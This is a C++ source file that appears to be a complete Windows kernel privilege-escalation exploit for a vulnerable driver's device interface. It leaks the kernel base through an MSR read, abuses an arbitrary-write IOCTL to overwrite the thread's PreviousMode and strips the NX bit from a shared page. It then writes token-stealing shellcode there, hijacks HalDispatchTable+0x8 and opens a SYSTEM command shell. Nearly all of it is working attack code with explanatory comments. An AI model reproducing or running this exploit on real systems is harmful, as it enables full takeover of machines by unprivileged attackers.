// gdrv_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>

#define IOCTL_MmGetPhysicalAddress 0xC350280C
#define IOCTL_MmMapIoSpace         0xC3502000
#define IOCTL_MmMapIoSpace2        0xC3502840

// For readmsr():
// IOCTL IOCTL 0xC3502580
// InputBufferLength == OutputBufferLength && InputBufferLength == 16
// can be used to leak the IA32_LSTAR MSR address 
#define IOCTL_readmsr_caller       0xC3502580   

// For writemsr():
// IOCTL 0xC3502580
// *(DWORD*)PSystemBuffer == 1
// can be used to write the IA32_LSTAR MSR and overwrite KiSystemCall64() address
#define IOCTL_writemsr_caller      0xC3502580   
#define IOCTL_ZwUnmapViewOfSection 0xC3502008
#define IOCTL_ArbitraryWrite 0xC3502808 

#pragma comment(lib, "ntdll")

#define SystemHandleInformation 0x10
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

extern "C" NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

extern "C" NTSTATUS NtQueryIntervalProfile(
          ULONG  ProfileSource,
          PULONG Interval );

extern "C" NTSTATUS NtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID  BaseAddress,
    PVOID  Buffer,
    ULONG  NumberOfBytesToRead,
    PULONG NumberOfBytesReaded);

extern "C" NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID  BaseAddress,
    PVOID  Buffer,
    ULONG  NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


ULONG_PTR ReadMSR(DWORD MSRIndex)
{
    printf("[*] in ReadMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }
    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    InputBuffer[0] = 1; // 1 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_readmsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        printf("[+] ReadMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_readmsr_caller);

        DWORD HighDWORD = OutputBuffer[3];
        DWORD LowDWORD = OutputBuffer[2];

        UINT64 KiSystemCall64Address = ((UINT64)HighDWORD << 32) | (UINT64)LowDWORD;
        printf("[+] Leaked nt!KiSystemCall64 address: 0x%p\n", KiSystemCall64Address);

        // --- Clearing and returning---
        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return KiSystemCall64Address;
    }

    printf("[-] Unable to call IOCTL 0x%x: GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;
}

ULONG_PTR LeakNtoskrnlBaseAddress()
{
    DWORD MSRIndex = 0xC0000082;
    ULONG_PTR KiSystemCall64Address = ReadMSR(MSRIndex);
    DWORD IAT_Offset = 0x40C600; // This might be different between versions of Windows !!!

    printf("[+] IAT offset of nt!KiSystemCall64: 0x%x\n", IAT_Offset);

    // ntoskrnl.exe base address can be found in IDA under: Edit -> Segments -> Rebase Program...
    ULONG_PTR BaseAddress = KiSystemCall64Address - IAT_Offset;
    printf("[+] Leaked ntoskrnl.exe base address: 0x%p\n", BaseAddress);

    return BaseAddress;
}

ULONG_PTR g_BaseAddress = LeakNtoskrnlBaseAddress();


VOID WriteMSR(DWORD MSRIndex, ULONG_PTR Overwrite)
{
    printf("[*] in WriteMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    DWORD LowDWORD = (DWORD)(Overwrite & 0xFFFFFFFF);           // obtain lower DWORD of Overwrite variable
    DWORD HighDWORD = (DWORD)((Overwrite >> 32) & 0xFFFFFFFF);  // obtain higher DWORD of Overwrite variable

    InputBuffer[0] = 0;         // 0 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;  // The MSR register index that we want to overwrite
    InputBuffer[2] = LowDWORD;  // Lower 32-bit value that the MSR will be overwritten with
    InputBuffer[3] = HighDWORD; // Higher 32-bit value that the MSR will be overwritten with

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_writemsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        DebugBreak();
        printf("[+] WriteMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_writemsr_caller);
    }
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);

}

ULONG_PTR GetPhysicalAddress(ULONG_PTR VirtualAddress)
{
    printf("[+] In GetPhysicalAddress()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice2 = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice2 == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 8);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 8);

    //RtlCopyMemory(InputBuffer, &VirtualAddress, )
    DWORD BytesReturned = 0;
    DWORD PhysicalAddress = 0;
    if (DeviceIoControl(hDevice2, IOCTL_MmGetPhysicalAddress, &VirtualAddress, 8, OutputBuffer, 8, &BytesReturned, nullptr))
    {
        PhysicalAddress = *OutputBuffer;
        printf("[+] GetPhysicalAddress() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmGetPhysicalAddress);
        printf("[+] Physical Address returned for 0x%p is: 0x%p\n", VirtualAddress, PhysicalAddress);

        free(InputBuffer);
        free(OutputBuffer);
        CloseHandle(hDevice2);
        return PhysicalAddress;
    }

    printf("[-] Unable to execute IOCTL_MmGetPhysicalAddress, GetLastError(): %u\n", GetLastError());
    free(InputBuffer);
    free(OutputBuffer);
    CloseHandle(hDevice2);

    return -1;

}

PVOID LeakKthreadAddress(DWORD TargetPID, DWORD TargetTID)
{
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
    PSYSTEM_HANDLE_INFORMATION SystemInformation = NULL;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    ULONG SystemHandleInformationSize = 0x100000;

    PVOID ObjectAddress = NULL;
    DWORD PID = 0;

    do {
        if (SystemInformation)
            free(SystemInformation);

        SystemInformation = (PSYSTEM_HANDLE_INFORMATION)calloc(1, SystemHandleInformationSize);
        if (!SystemInformation) {
            printf("Memory allocation failed!\n");
            return NULL;
        }

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
            SystemInformation, SystemHandleInformationSize, &SystemHandleInformationSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed with status: 0x%x\n", status);
        free(SystemInformation);
        CloseHandle(hThread);
        return NULL;
    }

    for (int i = 0; i < SystemInformation->NumberOfHandles; i++)
    {
        PID = SystemInformation->Handles[i].UniqueProcessId;
        if (PID != TargetPID)
            continue;

        if (SystemInformation->Handles[i].ObjectTypeIndex == 8)
        {
            ObjectAddress = SystemInformation->Handles[i].Object;
            printf("[*] PID: %d | _ETHREAD Object Address: 0x%p\n", PID, ObjectAddress);
            break;
        }

    }
    if (!ObjectAddress)
        printf("[-] Object Address not found: GetLastError(): %u\n", GetLastError());

    free(SystemInformation);
    CloseHandle(hThread);
    return ObjectAddress;
}

PVOID LeakProcessAddress(DWORD TargetPID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    PSYSTEM_HANDLE_INFORMATION SystemInformation = NULL;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    ULONG SystemHandleInformationSize = 0x100000;

    PVOID ObjectAddress = NULL;
    DWORD PID = 0;

    do {
        if (SystemInformation)
            free(SystemInformation);

        SystemInformation = (PSYSTEM_HANDLE_INFORMATION)calloc(1, SystemHandleInformationSize);
        if (!SystemInformation) {
            printf("Memory allocation failed!\n");
            return NULL;
        }

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
            SystemInformation, SystemHandleInformationSize, &SystemHandleInformationSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed with status: 0x%x\n", status);
        free(SystemInformation);
        return NULL;
    }

    for (int i = 0; i < SystemInformation->NumberOfHandles; i++)
    {
        PID = SystemInformation->Handles[i].UniqueProcessId;
        if (PID != TargetPID)
            continue;

        if (SystemInformation->Handles[i].ObjectTypeIndex == 7)
        {
            ObjectAddress = SystemInformation->Handles[i].Object;
            printf("[*] PID: %d | _EPROCESS Object Address: 0x%p\n", PID, ObjectAddress);
            break;
        }
        ;
    }
    if (!ObjectAddress)
        printf("[-] Object Address not found: GetLastError(): %u\n", GetLastError());

    CloseHandle(hProcess);
    free(SystemInformation);

    return ObjectAddress;
}

/*
A bug in the IOCTL, specifically in the way that the first argument is being passed to the memmove()
(a bug that only moves the lower DWORD of the given address), the IOCTL causes a BugCheck and crashes the system.
If the whole 64-bit address would have moved, the exploit would have worked and we'll receive a SYSTEM shell.

VOID Exploit(ULONG_PTR CurrentProcessObjectAddress,
             ULONG_PTR SystemTokenPhysicalAddress,
             ULONG_PTR CurrentProcessTokenAddress)
{
    printf("[+] In Exploit()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    printf("[*] Exploit Handle value: 0x%p\n", hDevice);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");


    //PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    //PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    //printf("[*] SYSTEM Process Base Address: 0x%p\n", SystemProcessObjectAddress);
    //printf("[*] Current Process Base Address: 0x%p\n", CurrentProcessObjectAddress);


    //ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    //ULONG_PTR  CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;

    //printf("[*] SYSTEM Token Virtual Address: 0x%p\n", SystemTokenAddress);
    //printf("[*] Local Process Token Virtual Address: 0x%p\n", CurrentProcessTokenAddress);


    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 0x40);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 0x40);
    printf("[*] User-Mode Virtual Address of InputBuffer: 0x%p\n", InputBuffer);

    DWORD AddressSize = 8;

    // 5th byte is being truncated because in GetPhysicalAddress()'s IOCTL because:
    // Irp->IoStatus.Information = 4 bytes
    printf("[*] SYSTEM Token Physical Address: 0x%p\n", SystemTokenPhysicalAddress);

    RtlCopyMemory((BYTE*)InputBuffer + 8, &SystemTokenPhysicalAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 20, &AddressSize, 4);
    RtlCopyMemory((BYTE*)InputBuffer + 24, &CurrentProcessTokenAddress, 8);

    printf("InputBuffer[0]: %p\n", InputBuffer[0]);
    printf("InputBuffer[1]: %p\n", InputBuffer[1]);
    printf("InputBuffer[2]: %p\n", InputBuffer[2]);
    printf("InputBuffer[3]: %p\n", InputBuffer[3]);
    printf("InputBuffer[4]: %p\n", InputBuffer[4]);

    //DebugBreak();

    printf("[*] Debug: getting into DeviceIoControl() request\n");
    DWORD BytesReturned = 0;
    //DebugBreak();
    if (DeviceIoControl(hDevice, IOCTL_MmMapIoSpace, InputBuffer, 0x40, OutputBuffer, 0x40, &BytesReturned, nullptr))
        printf("[+] Exploit() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmMapIoSpace);
    DebugBreak();

    CloseHandle(hDevice);
    free(InputBuffer);
    free(OutputBuffer);
}

*/

/*
PVOID MemoryMapper(ULONG_PTR PhysicalAddress)
{
    printf("[*] In MemoryMapper()...\nPress Enter to continue...");
    getchar();


    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return nullptr;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    PVOID MappedAddress = nullptr;
    DWORD* InputBuffer = (DWORD*)calloc(1, 16);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 16);
    DWORD NumberOfBytes = 0xa40;

    RtlCopyMemory((BYTE*)InputBuffer, &PhysicalAddress, 8);   // IoAllocateMdl() -> "PhysicalAddress" argument
    RtlCopyMemory((BYTE*)InputBuffer+8, &NumberOfBytes, 4);   // IoAllocateMdl() -> "NumberOfBytes" argument

    printf("[+] Debug: before DeviceIoControl()...\n");
    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_MmMapIoSpace2, InputBuffer, 16, OutputBuffer, 16, &BytesReturned, nullptr))
    {
        if (*OutputBuffer)
        {
            printf("[+] Mapped Memory Address: 0x%p\n", *OutputBuffer);
            MappedAddress = (PVOID)*OutputBuffer;
            free(InputBuffer);
            free(OutputBuffer);
            CloseHandle(hDevice);
            return MappedAddress;
        }
        else
        {
            printf("[-] Error executing DeviceIoControl() -> GetLastError(): %u\n", GetLastError());
            free(InputBuffer);
            free(OutputBuffer);
            CloseHandle(hDevice);
            return 0;
        }

    }

    printf("[-] Error executing DeviceIoControl() -> GetLastError(): %u\n", GetLastError());
    return 0;

}
*/

VOID ArbitraryWrite(ULONG_PTR SrcAddress, ULONG_PTR DstAddress, ULONG_PTR Size)
{
    printf("[*] In ArbitraryWrite()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    printf("[*] SrcAddress: 0x%p\n", SrcAddress);
    printf("[*] DstAddress: 0x%p\n", DstAddress);
    printf("[*] Size: 0x%p\n", Size);

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 24);

    RtlCopyMemory((BYTE*)InputBuffer, &DstAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 8, &SrcAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 16, &Size, 4);

    printf("[*] InputBuffer[0]: %p\n", InputBuffer[0]);
    printf("[*] InputBuffer[1]: %p\n", InputBuffer[1]);
    printf("[*] InputBuffer[2]: %p\n", InputBuffer[2]);

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_ArbitraryWrite, InputBuffer, 24, nullptr, 0, &BytesReturned, nullptr))
        printf("[+] DeviceIoControl() on 0x%x executed successfully!\n", IOCTL_ArbitraryWrite);
    else
        printf("[-] DeviceIoControl() on 0x%x failed with GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    CloseHandle(hDevice);
}

PVOID ReadPTE(HANDLE hProcess, ULONG_PTR Address)
{
    //BaseAddress + 0x2DDF70 + 0x13) == nt!MiGetPteAddress+0x13 which holds the PTEBase address
    //NOTE: The offset above is different between OSes
    
    ULONG_PTR PteBase = 0;
    ULONG_PTR Base = LeakNtoskrnlBaseAddress();
    ULONG_PTR pPteBase = Base + 0x2DDF70 + 0x13;
 
    NTSTATUS status = NtReadVirtualMemory(hProcess, (PVOID)pPteBase, (PVOID)&PteBase, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error in reading nt!MiGetPteAddress+0x13 -> NTSTATUS: 0x%x\n", status);
        //return (PVOID)PteBase;
    }

    printf("[+] PTE Base (nt!MiGetPteAddress+0x13): 0x%p\n", PteBase);

    // Need to modify KUSER_SHARED_DATA+0x800 PTE values and make the page executable!!!
    // implelment nt!MiGetPteAddress and get the PTE base from nt!MiGetPteAddress+0x13 

    // Implementing nt!MiGetPteAddress:
    ULONG_PTR PTEAddress = Address >> 9;
    PTEAddress &= 0x7FFFFFFFF8;
    PTEAddress += PteBase;

    return (PVOID)PTEAddress;
}

int main()
{
    printf("[*] Starting execution...\n");
    NTSTATUS status = 0;
    
    //Creating a Notification Event object that will be used as a mechanism
    HANDLE hEvent = CreateEventA(nullptr, TRUE, FALSE, "IsWritten"); 
    
    PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4
    ULONG_PTR shellcode_address = 0xfffff78000000800;
    //printf("[*] Current Process _EPROCESS (Virtual) Address: 0x%p\n", CurrentProcessObjectAddress);
    //printf("[*] SYSTEM Process _EPROCESS (Virtual) Address: 0x%p\n", SystemProcessObjectAddress);

    ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    ULONG_PTR CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;
    ULONG_PTR Size = 8;

    PVOID CurrentThreadObjectAddress = LeakKthreadAddress(GetCurrentProcessId(), GetCurrentThreadId());
    printf("[*] Current _ETHREAD object address: 0x%p\n", CurrentThreadObjectAddress);

    printf("[*] Press enter to overwrite PreivousMode...\n");
    getchar();
    printf("[*] Overwriting PreviousMode on current thread...\n");
    ArbitraryWrite(shellcode_address, (ULONG_PTR)((ULONG_PTR)CurrentThreadObjectAddress + 0x232), (ULONG_PTR)1);
    printf("[+] PreviousMode was successfully overwritten!...\n");

    /*
    When _ETHREAD.PreviousMode field is overwritten, the kernel sees this thread as a "Kernel Thread"
    in read/write operations. This means that both reading and writing is available on kernel space;
    */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4); // Opening a handle to SYSTEM (4) process
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error opening handle to SYSTEM... GetLastError(): %u\n", GetLastError());
        return -1;
    }
    ULONG_PTR PTEAddress = (ULONG_PTR)ReadPTE(hProcess, shellcode_address);
    printf("[+] KUSER_SHARED_DATA+0x800 PTE address: 0x%p\n", PTEAddress);

    // Reading retrieved PTE Address' permission set
    ULONG_PTR PtePermissionSet = 0;
    status = NtReadVirtualMemory(hProcess, (PVOID)PTEAddress, (PVOID)&PtePermissionSet, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error in reading KUSER_SHARED_DATA+0x800 PTE | NTSTATUS: 0x%x\n", status);
        return -1;
    }
    printf("[*] KUSER_SHARED_DATA+0x800 PTE Permission set: %p\n", PtePermissionSet);

    PtePermissionSet ^= 0x8000000000000000; // Removing NX bit from PTE...
    printf("[*] KUSER_SHARED_DATA+0x800 Modified PTE Permissions set: %p\n", PtePermissionSet);

    status = NtWriteVirtualMemory(hProcess, (PVOID)PTEAddress, &PtePermissionSet, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error in writing KUSER_SHARED_DATA+0x800 PTE | NTSTATUS: 0x%x\n", status);
        return -1;
    }

    /*
    *shellcode itself*
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
    "\x48\x8B\x80\xB8\x00\x00\x00"                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
    "\x48\x89\xC3"                                      # mov rbx,rax         ; Copy current process to rbx
    "\x48\x8B\x9B\xE8\x02\x00\x00"                      # mov rbx,[rbx+0x448] ; ActiveProcessLinks
    "\x48\x81\xEB\xE8\x02\x00\x00"                      # sub rbx,0x2e8       ; Go back to current process
    "\x48\x8B\x8B\x40\x04\x00\x00"                      # mov rcx,[rbx+0x440] ; UniqueProcessId (PID)
    "\x48\x83\xF9\x04"                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
    "\x75\xE5"                                          # jnz 0x13            ; Loop until SYSTEM PID is found
    "\x48\x8B\x8B\xB8\x04\x00\x00"                      # mov rcx,[rbx+0x4B8] ; SYSTEM token is @ offset _EPROCESS + 0x4B8
    "\x48\x89\x88\xB8\x04\x00\x00"                      # mov [rax+0x4B8],rcx ; Copy SYSTEM token to current process
    "\xC3"                                              # ret                 ; Done!
    */

    char payload[] =
        "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"//              # mov rax, [gs:0x188]; Current thread(KTHREAD)
        "\x48\x8B\x80\xB8\x00\x00\x00"        //              # mov rax, [rax + 0xb8]; Current process(EPROCESS)
        "\x48\x89\xC3"                        //              # mov rbx, rax; Copy current process to rbx
        "\x48\x8B\x9B\x48\x04\x00\x00"        //              # mov rbx, [rbx + 0x448]; ActiveProcessLinks
        "\x48\x81\xEB\x48\x04\x00\x00"        //              # sub rbx, 0x448; Go back to current process
        "\x48\x8B\x8B\x40\x04\x00\x00"        //              # mov rcx, [rbx + 0x440]; UniqueProcessId(PID)
        "\x48\x83\xF9\x04"                    //              # cmp rcx, byte + 0x4; Compare PID to SYSTEM PID
        "\x75\xE5"                            //              # jnz 0x13; Loop until SYSTEM PID is found
        "\x48\x8B\x8B\xB8\x04\x00\x00"        //              # mov rcx, [rbx + 0x4B8]; SYSTEM token is @ offset _EPROCESS + 0x4B8
        "\x48\x89\x88\xB8\x04\x00\x00"        //              # mov[rax + 0x4B8], rcx; Copy SYSTEM token to current process
        "\xC3";

    printf("\n");

    // Writing shellcode
    printf("[*] Writing Token Stealing shellcode...\n");
    status = NtWriteVirtualMemory(hProcess, (PVOID)shellcode_address, (PVOID)&payload, sizeof(payload), nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error writing shellcode into KUSER_SHARED_DATA+0x800 PTE | NTSTATUS: 0x%x\n", status);
        return -1;
    }

    ULONG_PTR HalDispatchTable = g_BaseAddress + 0xc00a60;
    printf("[+] nt!HalDispatchTable base address: 0x%p\n", HalDispatchTable);

    ULONG_PTR OriginalNtQueryIntervalProfileAddress;
    status = NtReadVirtualMemory(hProcess, (PVOID)((ULONG_PTR)HalDispatchTable + 0x8), &OriginalNtQueryIntervalProfileAddress, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error reading original HalDispatchTable+0x8 | NTSTATUS: 0x%x\n", status);
        return -1;
    }

    printf("[*] Original nt!HalDispatchTable+0x8 address: 0x%p\n", OriginalNtQueryIntervalProfileAddress);
    printf("[+] Press Enter to overwrite nt!HalDispatchTable+0x8...");
    getchar();

    status = NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)HalDispatchTable+0x8), (PVOID)&shellcode_address, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error writing shellcode into KUSER_SHARED_DATA+0x800 PTE | NTSTATUS: 0x%x\n", status);
        return -1;
    }

    printf("[+] nt!HalDispatchTable+0x8 was overwritten successfully!...\n");
 
    ULONG Interval = 0;
    status = NtQueryIntervalProfile(0x1234, &Interval); //Invoke the shellcode execution
    if(!NT_SUCCESS(status))
    {
        printf("[-] Error executing NtQueryIntervalProfile() - NTSTATUS 0x%x\n", status);
        return status;
    }
    
    printf("[+] Shellcode Executed - Current process token was overwritten with SYSTEM token!\n");
    
    // Returning original address in nt!HalDispatchTable+0x8
    status = NtWriteVirtualMemory(hProcess, (PVOID)((ULONG_PTR)HalDispatchTable + 0x8), (PVOID)&OriginalNtQueryIntervalProfileAddress, 8, nullptr);
    if (!NT_SUCCESS(status))
    {
        printf("[-] Error in returning original address in nt!HalDispatchTable+0x8 | NTSTATUS: 0x%x\n", status);
        return -1;
    }
    
    printf("Press Enter to get a SYSTEM shell...\n");
    getchar();

    DWORD ThreadID = 0;
    char command[] = "cmd.exe";
    HANDLE hThread = CreateThread(nullptr, 1024, (LPTHREAD_START_ROUTINE)system, &command, 0, &ThreadID);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    
    return 0;
}





